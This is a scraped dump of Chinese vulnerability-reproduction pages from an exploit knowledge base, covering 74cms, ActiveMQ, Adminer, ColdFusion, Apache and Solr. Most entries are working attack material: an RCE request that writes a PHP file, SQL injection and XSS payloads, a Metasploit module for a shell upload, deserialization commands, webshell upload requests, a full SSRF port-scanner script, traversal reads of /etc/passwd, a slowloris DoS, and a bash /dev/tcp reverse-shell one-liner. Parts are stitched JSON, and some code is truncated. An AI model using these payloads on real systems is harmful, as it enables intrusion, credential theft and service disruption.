zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/74cms/index.php?m=Admin&c=Config&a=index Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 465 Connection: close Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&site_domain='%2C+file_put_contents('403.php'%2Cbase64_decode('PD9waHAgcGhwaW5mbygpOz8%2B'))%2C'&site_dir=%2F74cms%2F&top_tel=000-00000000&bootom_tel=000-00000000&contact_email=&address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&icp=icp000000000&isclose=0&close_reason=&statistics=&logo_home=&logo_other= GET /74cms/Application/Common/Conf/url.php HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 成功截图 四、参考链接 https://github.com/kyrie403/Vuln/blob/master/74cms/74cms%20v5.0.1%20remote%20code%20execution.md 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-16 11:05:44 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/74cms/2.html":{"url":"0day/74cms/2.html","title":"74cms v5.0.1前台sql注入","keywords":"","body":"74cms v5.0.1 前台sql注入 一、漏洞简介 74cms 5.0.1 前台AjaxPersonalController.class.php存在SQL注入 二、漏洞影响 三、复现过程 具体信息 文件位置：74cms\\upload\\Application\\Home\\Controller\\AjaxPersonalController.class.php 方法：function company_focus($company_id) 是否需登录：需要 登录权限：普通用户即可 Payload: http://0-sec.org/74cms/5.0.1/upload/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a 源码分析： 文件：74cms\\upload\\Application\\Home\\Controller\\AjaxPersonalController.class.php company_focus 方法是参数化函数，$company_id参数是不经过I函数过滤的，所以只要where可以控制，那就可以注入 跟踪add_focus(),发现SQL语句参数外部都可以控制，导致了注入漏洞 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 14:42:32 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/74cms/3.html":{"url":"0day/74cms/3.html","title":"74cms v6.0.4 反射型xss","keywords":"","body":"74cms v6.0.4 反射型xss 一、漏洞简介 二、漏洞影响 74cms v6.0.4 三、复现过程 http://www.0-sec.org/index.php?m=&c=help&a=help_list&key=137244gq1lw%253cscript%253ealert%25281%2529%253c%252fscript%253edutvxlqd4lq&__hash__=d7aa5a382f14d270c3ac4de8392b4e1d_a34adb2b339972672eb447276f69ee88 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-08 20:13:16 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/ActiveMQ/2.html":{"url":"0day/ActiveMQ/2.html","title":"ActiveMQ物理路径泄漏漏洞","keywords":"","body":"ActiveMQ物理路径泄漏漏洞 一、漏洞简介 ActiveMQ默认开启PUT请求，当开启PUT时，构造好Payload(即不存在的目录)，Response会返回相应的物理路径信息 二、漏洞影响 三、复现过程 Request Raw: PUT /fileserver/a../../%08/..%08/.%08/%08 HTTP/1.1 Host: 192.168.197.25:8161 Authorization: Basic YWRtaW46YWRtaW4= Content-Length: 4 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-06 22:11:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/ActiveMQ/CVE-2015-1830.html":{"url":"0day/ActiveMQ/CVE-2015-1830.html","title":"（CVE-2015-1830）ActiveMQ 路径遍历导致未经身份验证的rce","keywords":"","body":"（CVE-2015-1830）ActiveMQ 路径遍历导致未经身份验证的rce 一、漏洞简介 Windows 5.11.2之前的Apache ActiveMQ 5.x中blob消息的文件服务器上载/下载功能中的目录遍历漏洞允许远程攻击者通过未指定的向量在任意目录中创建JSP文件。 二、漏洞影响 ActiveMQ 5.11.1 三、复现过程 msf poc 直接在msf里面搜索就行了，如果没有请更新msf版本，或者手动复制下面的脚本到msf目录下。 ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule 'Apache ActiveMQ 5.x-5.11.1 Directory Traversal Shell Upload', 'Description' => %q{ This module exploits a directory traversal vulnerability (CVE-2015-1830) in Apache ActiveMQ 5.x before 5.11.2 for Windows. The module tries to upload a JSP payload to the /admin directory via the traversal path /fileserver/..\\\\admin\\\\ using an HTTP PUT request with the default ActiveMQ credentials admin:admin (or other credentials provided by the user). It then issues an HTTP GET request to /admin/.jsp on the target in order to trigger the payload and obtain a shell. }, 'Author' => [ 'David Jorm', # Discovery and exploit 'Erik Wynter' # @wyntererik - Metasploit ], 'References' => [ [ 'CVE', '2015-1830' ], [ 'EDB', '40857'], [ 'URL', 'https://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt' ] ], 'Privileged' => false, 'Platform' => %w{ win }, 'Targets' => [ [ 'Windows Java', { 'Arch' => ARCH_JAVA, 'Platform' => 'win' } ], ], 'DisclosureDate' => '2015-08-19', 'License' => MSF_LICENSE, 'DefaultOptions' => { 'RPORT' => 8161, 'PAYLOAD' => 'java/jsp_shell_reverse_tcp' }, 'DefaultTarget' => 0)) register_options([ OptString.new('TARGETURI', [true, 'The base path to the web application', '/']), OptString.new('PATH', [true, 'Traversal path', '/fileserver/..\\\\admin\\\\']), OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']), OptString.new('PASSWORD', [true, 'Password to authenticate with', 'admin']) ]) end def check print_status(\"Running check...\") testfile = Rex::Text::rand_text_alpha(10) testcontent = Rex::Text::rand_text_alpha(10) send_request_cgi({ 'uri' => normalize_uri(target_uri.path, datastore['PATH'], \"#{testfile}.jsp\"), 'headers' => { 'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']) }, 'method' => 'PUT', 'data' => \"\" }) res1 = send_request_cgi({ 'uri' => normalize_uri(target_uri.path,\"admin/#{testfile}.jsp\"), 'headers' => { 'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']) }, 'method' => 'GET' }) if res1 && res1.body.include?(testcontent) send_request_cgi( opts = { 'uri' => normalize_uri(target_uri.path,\"admin/#{testfile}.jsp\"), 'headers' => { 'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']) }, 'method' => 'DELETE' }, timeout = 1 ) return Exploit::CheckCode::Vulnerable end Exploit::CheckCode::Safe end def exploit print_status(\"Uploading payload...\") testfile = Rex::Text::rand_text_alpha(10) vprint_status(\"If upload succeeds, payload will be available at #{target_uri.path}admin/#{testfile}.jsp\") #This information is provided to allow for manual execution of the payload in case the upload is successful but the GET request issued by the module fails. send_request_cgi({ 'uri' => normalize_uri(target_uri.path, datastore['PATH'], \"#{testfile}.jsp\"), 'headers' => { 'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']) }, 'method' => 'PUT', 'data' => payload.encoded }) print_status(\"Payload sent. Attempting to execute the payload.\") res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path,\"admin/#{testfile}.jsp\"), 'headers' => { 'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']) }, 'method' => 'GET' }) if res && res.code == 200 print_good(\"Payload executed!\") else fail_with(Failure::PayloadFailed, \"Failed to execute the payload\") end end end 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-08 19:31:01 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/ActiveMQ/CVE-2015-5254.html":{"url":"0day/ActiveMQ/CVE-2015-5254.html","title":"（CVE-2015-5254）ActiveMQ 反序列化漏洞","keywords":"","body":"（CVE-2015-5254）ActiveMQ 反序列化漏洞 一、漏洞简介 Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。 二、漏洞影响 Apache ActiveMQ 5.13.0之前的5.x版本 三、复现过程 漏洞利用过程如下： 构造（可以使用ysoserial）可执行命令的序列化对象 作为一个消息，发送给目标61616端口 访问web管理页面，读取消息，触发漏洞 使用jmet进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。 jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。 执行： java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"touch /tmp/success\" -Yp ROME your-ip 61616 此时会给目标ActiveMQ添加一个名为event的队列，我们可以通过http://your-ip:8161/admin/browse.jsp?JMSDestination=event看到这个队列中所有消息： 点击查看这条消息即可触发命令执行，此时进入容器docker-compose exec activemq bash，可见/tmp/success已成功创建，说明漏洞利用成功： 将命令替换成弹shell语句再利用： 值得注意的是，通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。 参考链接 https://vulhub.org/#/environments/activemq/CVE-2015-5254/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-24 21:13:42 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/ActiveMQ/1.html":{"url":"0day/ActiveMQ/1.html","title":"（CVE-2016-3088）ActiveMQ应用漏洞","keywords":"","body":"（CVE-2016-3088）ActiveMQ应用漏洞 一、漏洞简介 ActiveMQ是一款流行的开源消息服务器。默认情况下，ActiveMQ服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。 二、漏洞影响 Apache ActiveMQ 5.x ~ 5.14.0 三、复现过程 漏洞是需要登录之后才可以执行 漏洞利用就是/fileserver/有put上传权限，/admin/有执行权限，可找到绝对路径，使用move移动文件到/admin/ 下面就是两步走，先是利用put上传文件到/fileserver/,然后移动到move到admin下面 所有返回为204就代表是成功，有个坑点：不要put同文件名的文件上去 如果上传不解析的话，则是证明没有权限！！！ 如果上传不解析的话，则是证明没有权限！！！ 如果上传不解析的话，则是证明没有权限！！！ ActiveMQ默认开启PUT方法，当fileserver存在时我们可以上传jspwebshell。 PUT /fileserver/shell.jsp HTTP/1.1 Host: 192.168.197.25:8161 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: keep-alive Upgrade-Insecure-Requests: 1 Authorization: Basic YWRtaW46YWRtaW4= shell 利用 MOVE 方法将 Webshell 移入 admin/ 目录 Request Raw: MOVE /fileserver/shell.jsp HTTP/1.1 Destination:file:/data/apache-activemq-5.7.0/webapps/admin/shell.jsp Host: 192.168.197.25:8161 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: keep-alive Upgrade-Insecure-Requests: 1 Authorization: Basic YWRtaW46YWRtaW4= Content-Length: 17 Content-Length: 0 shell 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-28 11:39:24 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/ActiveMQ/3.html":{"url":"0day/ActiveMQ/3.html","title":"（CVE-2017-15709）ActiveMQ 信息泄漏漏洞","keywords":"","body":"（CVE-2017-15709）ActiveMQ 信息泄漏漏洞 一、漏洞简介 Apache ActiveMQ默认消息队列61616端口对外，61616端口使用了OpenWire协议，这个端口会暴露服务器相关信息，这些相关信息实际上是debug信息。 会返回应用名称，JVM，操作系统以及内核版本等信息。 二、漏洞影响 apache-activemq-5.15.0 to apache-activemq-5.15.2 apache-activemq-5.14.0 to apache-activemq-5.14.5 三、复现过程 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-06 22:16:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Adminer/shell.html":{"url":"0day/Adminer/shell.html","title":"Adminers 1.1.3 （SQLite 3 写入一句话木马）","keywords":"","body":"Adminers 1.1.3 （SQLite 3 写入一句话木马） 一、漏洞简介 需要登陆Adminers，并且需要知道网站的路径。 二、漏洞影响 三、复现过程 ATTACH DATABASE 'z.php' AS t;create TABLE t.e (d text);/* ATTACH DATABASE '/网站/路径/shell.php' AS t;insert INTO t.e (d) VALUES ('');/* 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-12 00:03:21 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Adminer/CVE-2018-7667.html":{"url":"0day/Adminer/CVE-2018-7667.html","title":"（CVE-2018-7667）服务器端请求伪造漏洞","keywords":"","body":"（CVE-2018-7667）服务器端请求伪造漏洞 一、漏洞简介 Adminer 4.3.1及之前版本存在服务器端请求伪造漏洞。攻击者可借助‘server’参数利用该漏洞绕过防火墙，确定内部主机，扫描其他服务器的端口。 二、漏洞影响 Adminer 三、复现过程 poc import socket,re,ssl,warnings,subprocess,time from platform import system as system_name from os import system as system_call #Adminer Server Side Request Forgery #PortMiner Scanner Tool #by John Page (hyp3rlinx) #ISR: ApparitionSec #hyp3rlinx.altervista.org #========================= #D1rty0Tis says hi. #timeout MAX_TIME=32 #ports to log port_lst=[] #Web server response often times out but usually means ports open. false_pos_ports=['80','443'] BANNER=''' ____ _ __ __ _ | _ \\ | | | \\/ (_) | |__) |__ _ __| |_| \\ / |_ _ __ ___ _ __ | ___/ _ \\| '__| __| |\\/| | | '_ \\ / _ \\ '__| | | | (_) | | | |_| | | | | | | | __/ | |_| \\___/|_| \\__|_| |_|_|_| |_|\\___|_| ''' def info(): print \"\\nPortMiner depends on Error messages to determine open/closed ports.\" print \"Read operations reported 'timed out' may be open/filtered.\\n\" def greet(): print 'Adminer Unauthenticated SSRF Port Scanner Tool' print 'Targets Adminer used for MySQL administration\\n' print 'by hyp3rlinx - apparition security' print '-----------------------------------------------------\\n' print 'Scan small ranges or single ports or expect to wait.\\n' print 'Do not scan networks without authorized permission.' print 'Author not responsible for abuse/misuse.\\n' def chk_ports(p): p=p.replace('-',',') port_arg=p.split(',') try: if len(port_arg)>1: if int(port_arg[1]) 65535: print 'Exceeded max Port range 65535.' raw_input() return except Exception as e: print str(e) return None return list(range(int(port_arg[0]),int(port_arg[1])+1)) def log(IP): try: file=open('PortMiner.txt', 'w') file.write(IP+'\\n') for p in port_lst: file.write(p+'\\n') file.close() except Exception as e: print str(e) print \"\\nSee PortMiner.txt\" def use_ssl(ADMINER,ADMINER_PORT): try: s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ADMINER,int(ADMINER_PORT))) s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23) s.close() except Exception as e: print \"\" return False return True def version(ip,port,uri,use_ssl): res=\"\" try: s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip,int(port))) if use_ssl: s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23) s.send('GET '+'/'+uri+'/?server='+':'+'&username=\\r\\n\\r\\n') except Exception as e: print 'Host up but cant connect.' #str(e) print 'Re-check Host/Port/URI.' s.close() return 504 while True: RES=s.recv(512) if RES.find('Forbidden')!=-1: print 'Forbidden 403' s.close() return None if RES.find('401 Authorization Required')!=-1: print '401 Authorization Required' s.close() return None ver = re.findall(r'(.*)',RES,re.DOTALL|re.MULTILINE) if not RES: s.close() return None if ver: print 'Your Adminer '+ ver[0] + ' works for us now.' s.close() return ver s.close() return None def scan(ADMINER,ADMINER_PORT,ADMINER_URI,TARGET,PORTS_TO_SCAN,PRINT_CLOSED,USE_SSL): global MAX_TIME,port_range RES='' print 'scanning ports: %s ' % str(port_range[0])+'to ' + str(port_range[-1])+' ...' for aPort in port_range: aPort=str(aPort) try: s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.settimeout(MAX_TIME) s.connect((ADMINER,ADMINER_PORT)) if USE_SSL: s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23) s.send('GET /'+ADMINER_URI+'/?server='+TARGET+':'+aPort+'&username= HTTP/1.1\\r\\nHost: '+TARGET+'\\r\\n\\r\\n') except Exception as e: print str(e) s.close() return while True: try: RES=s.recv(512) ###print RES ###Should see HTTP/1.1 403 not 200 if RES.find('HTTP/1.1 200 OK')!=-1: print 'port '+aPort + ' open' port_lst.append(aPort+' open') s.close() break if RES.find('400 Bad Request')!=-1: print '400 Bad Request, check params' s.close() break raw_input() lst=re.findall(r\"([^\\n].*connect to MySQL server on.*[^\\n])|(Lost connection to MySQL server at.*)|(MySQL server has gone away.*)\"+ \"|(No connection could be made because the target machine actively refused it.*)|(A connection attempt failed.*)|(HTTP/1.1 200 OK.*)\", RES) if lst: status=str(lst) if status.find('connect to MySQL')!=-1: if PRINT_CLOSED: print 'port '+ aPort + ' closed' s.close() break elif status.find('machine actively refused it.')!=-1: if PRINT_CLOSED: print 'port '+ aPort + ' closed' s.close() break elif status.find('A connection attempt failed')!=-1: if PRINT_CLOSED: print 'port '+ aPort + ' closed' s.close() break elif status.find('reading initial communication packet')!=-1: print 'port '+aPort + ' open' port_lst.append(aPort+' open') s.close() break elif status.find('MySQL server has gone away')!=-1: print 'port '+aPort + ' open' port_lst.append(aPort+' open') s.close() break elif status.find('Bad file descriptor')!=-1: print 'port '+aPort + ' open' port_lst.append(aPort+' open') s.close() break elif status.find('Got packets out of order')!=-1: print 'port '+aPort + ' open' s.close() break except Exception as e: msg = str(e) ###print msg if msg.find('timed out')!=-1 and aPort in false_pos_ports: print 'port '+aPort + ' open' port_lst.append(aPort+' open') s.close() break elif msg.find('timed out')!=-1: print 'port '+aPort + ' timed out' port_lst.append(aPort+' read operation timed out') s.close() break else: s.close() break if port_lst: log(TARGET) else: print \"Scan completed, no ports mined.\" return 0 def arp(host): args = \"-a\" if system_name().lower()==\"windows\" else \"-e\" return subprocess.call(\"arp \" + args + \" \" + host, shell=True) == 0 def ping_host(host): args = \"-n 1\" if system_name().lower()==\"windows\" else \"-c 1\" res=subprocess.call(\"ping \" + args + \" \" + host, shell=True) == 0 if not res: print str(host) + ' down? trying ARP' if not arp(host): print str(host) + ' unreachable.' return return res def main(): global port_range print BANNER greet() ADMINER_VERSION=False PRINT_CLOSED=False USE_SSL=None ADMINER=raw_input('[+] Adminer Host/IP> ') if ADMINER=='': print 'Enter valid Host/IP' ADMINER=raw_input('[+] Adminer Host/IP> ') ADMINER_PORT=raw_input('[+] Adminer Port> ') if not re.search(\"^\\d{1,5}$\",ADMINER_PORT): print 'Enter a valid Port.' ADMINER_PORT=raw_input('[+] Adminer Port> ') ADMINER_URI=raw_input('[+] Adminer URI [the adminer-.php OR adminer/ dir path] > ') TARGET=raw_input('[+] Host/IP to Scan> ') PORTS_TO_SCAN=raw_input('[+] Port Range e.g. 21-25> ').replace(' ','') plst=re.findall(r\"(\\d{1,5})-(\\d{1,5})\",PORTS_TO_SCAN) if not plst: print 'Invalid ports, format is 1-1025' return raw_input() #console up port_range=chk_ports(PORTS_TO_SCAN) if not port_range: return PRINT_CLOSED=raw_input('[+] Print closed ports? 1=Yes any key for No> ') if PRINT_CLOSED=='1': PRINT_CLOSED=True else: PRINT_CLOSED=False if not ping_host(ADMINER): print 'host %s not reachable or blocking ping ' % ADMINER cont=raw_input('Continue with scan? 1=Yes any key for No> ') if cont!='1': print 'Scan aborted.' raw_input() #console up return USE_SSL=use_ssl(ADMINER,ADMINER_PORT) time.sleep(2) ADMINER_VERSION = version(ADMINER,ADMINER_PORT,ADMINER_URI,USE_SSL) if not ADMINER_VERSION: print \"Can't retrieve Adminer script. check supplied URI.\" raw_input() #console up return else: if ADMINER_VERSION==504: raw_input() #console up return if scan(ADMINER,int(ADMINER_PORT),ADMINER_URI,TARGET,PORTS_TO_SCAN,PRINT_CLOSED,USE_SSL)==0: more=raw_input('Info: 1=Yes, any key for No> ') if more=='1': info() raw_input() #console up if __name__=='__main__': main() 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-11 23:56:43 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Adobe ColdFusion/CVE-2010-2861.html":{"url":"0day/Adobe ColdFusion/CVE-2010-2861.html","title":"（CVE-2010-2861）Adobe ColdFusion 文件读取漏洞","keywords":"","body":"（CVE-2010-2861）Adobe ColdFusion 文件读取漏洞 一、漏洞简介 Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。 二、漏洞影响 Adobe ColdFusion 8 Adobe ColdFusion 9 三、复现过程 直接访问http://www.0-sec.org:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en，即可读取文件/etc/passwd： 读取后台管理员密码http://www.0-sec.org:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en： 参考链接 https://vulhub.org/#/environments/coldfusion/CVE-2010-2861/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 23:28:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Adobe ColdFusion/CVE-2017-3066.html":{"url":"0day/Adobe ColdFusion/CVE-2017-3066.html","title":"（CVE-2017-3066）Adobe ColdFusion 反序列化漏洞","keywords":"","body":"（CVE-2017-3066）Adobe ColdFusion 反序列化漏洞 一、漏洞简介 二、漏洞影响 Adobe ColdFusion (2016 release) Update 3及之前的版本， ColdFusion 11 Update 11及之前的版本， ColdFusion 10 Update 22及之前的版本。 三、复现过程 使用ColdFusionPwn工具来生成POC。 点击下载ColdFusionPwn Usage java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-master-SNAPSHOT.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner [-s|-e] [payload type] '[command]' [outfile] 点击下载ysoserial 【注意】下载的jar包可能因为时间不同，而更新，包名也就不同。注意将命令中的包名，替换为你下载时候的名字 java -cp ColdFusionPwn.jar:ysoserial.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'touch /tmp/CVE-2017-3066_is_success' poc.ser 生成poc.ser文件后，将POC作为数据包body发送给http://your-ip:8500/flex2gateway/amf，Content-Type为application/x-amf POST /flex2gateway/amf HTTP/1.1 Host: your-ip:8500 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-amf Content-Length: 2853 [...poc...] 关于发送的内容编码问题 由于编码问题，如果直接从Notepad++/Notepad里面复制粘贴为body部分，是不成功的，即使返回的状态码是200 正确发送方式为： 右击选择Paste From File，上传poc.cer文件 再到Raw界面添加HTTP头部，如果成功，并且打算以后还需要用的话，右击选择Copy to File保存 进入容器中，发现/tmp/success已成功创建： 将POC改成反弹命令，成功拿到shell： 补充一下反弹shell的命令,可以通过http://www.jackson-t.ca/runtime-exec-payloads.html在线转换 bash -i >& /dev/tcp/ip/port 0>&1 参考链接 https://vulhub.org/#/environments/coldfusion/CVE-2017-3066/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-28 23:58:06 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache/1.html":{"url":"0day/Apache/1.html","title":"（CVE-2007-6750）Apache ddos","keywords":"","body":"（CVE-2007-6750）Apache ddos 一、漏洞简介 Apache HTTP服务器1.x和2.x允许远程攻击者通过部分HTTP请求导致拒绝服务(守护进程中断)，如Slowloris所示，这与2.2.15之前版本中缺少mod_ReqTimeout模块有关 二、漏洞影响 Apache 1.x/2.x 三、复现过程 nmap -sV -p80 192.168.146.175(用nmap查看Apache版本)(Apache2.2.3初步断定存在漏洞) 接着访问网站查看是否正常(发现网站正常) msfconsole(启动metasploit) use auxiliary/dos/http/slowloris(使用模块) set RHOST 192.168.146.175(设置目标IP) run(执行攻击) 再访问网站查看是否正常(发现网站瘫痪) 四、参考链接 https://www.jsxlo.com/cve-2007-6750/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-14 14:31:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache/CVE-2017-15715.html":{"url":"0day/Apache/CVE-2017-15715.html","title":"（CVE-2017-15715）Apache解析漏洞","keywords":"","body":"（CVE-2017-15715）Apache解析漏洞 一、漏洞简介 二、漏洞影响 Apache 2.4.0到2.4.29 三、复现过程 首先正常上传一个图片，发现无法上传 如果文件名取自$_FILES['file']['name']，就会自动把换行符去掉，而文件名取自post参数name中，就能很好的利用到这个解析漏洞 下面我们上传一个包含换行符的文件，这里需要注意只能时\\x0a而不是\\x0d\\x0a，\\x0d\\x0a的情况是我们直接添加一个换行符，我们利用burp的hex功能在test666.php后面添加一个\\x0a 从响应包中可以看到上传成功了，但是相应页面success.html中并没有告诉我们上传文件的目录 但是我们在请求包中还可以看到一个参数dir = /upload/，所以猜测上传目录为·/upload/test666.php%0a 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-16 01:15:02 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache/6.html":{"url":"0day/Apache/6.html","title":"（CVE-2019-0193）Apache Solr 远程命令执行漏洞","keywords":"","body":"（CVE-2019-0193）Apache Solr 远程命令执行漏洞 一、漏洞简介 Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。 二、漏洞影响 三、复现过程 如上图所示，首先打开刚刚创建好的test核心，选择Dataimport功能并选择debug模式，填入以下POC： 点击Execute with this Confuguration会发送以下请求包： POST /solr/test/dataimport?_=1565835261600&indent=on&wt=json HTTP/1.1 Host: localhost:8983 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Content-Length: 679 Connection: close Referer: http://localhost:8983/solr/ Cookie: csrftoken=gzcSR6Sj3SWd3v4ZxmV5OcZuPKbOhI6CMpgp5vIMvr5wQAL4stMtxJqL2sUE8INi; sessionid=snzojzqa5zn187oghf06z6xodulpohpr 